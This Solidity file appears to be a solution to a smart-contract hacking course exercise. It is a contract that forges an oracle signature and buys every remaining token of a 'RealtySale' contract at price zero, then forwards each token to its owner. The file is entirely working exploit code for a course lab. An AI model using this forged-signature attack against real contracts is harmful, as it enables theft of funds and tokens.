// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity 0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

struct SharePrice {
    uint256 expires; // Time which the price expires
    uint256 price; // Share Price in ETH
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

interface IRealtySale {
    function shareToken() external returns(address);
    function buyWithOracle(SharePrice calldata sharePrice, Signature calldata signature) external payable;
}

interface IRealtyToken {
    function lastTokenID() external returns(uint256);
    function maxSupply() external returns(uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AttackRealtySale is Ownable {

    address private realtyToken;
    address private realtySale;

    constructor(address _saleContractAddress) {
        realtySale = _saleContractAddress;
        realtyToken = IRealtySale(realtySale).shareToken();
    }

    function attack() external onlyOwner {

        SharePrice memory price = SharePrice(block.timestamp + 9999999, 0);
        Signature memory signature = Signature(1, keccak256("nothing"), keccak256("nothing"));

        uint256 currentTokenID = IRealtyToken(realtyToken).lastTokenID();
        uint256 maxSupply = IRealtyToken(realtyToken).maxSupply();

        while(currentTokenID < maxSupply) {
            IRealtySale(realtySale).buyWithOracle(price, signature);
            currentTokenID++;
        }
    }

    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) public returns(bytes4) {
        IRealtyToken(realtyToken).transferFrom(address(this), owner(), _tokenId);
        return this.onERC721Received.selector;
    }

}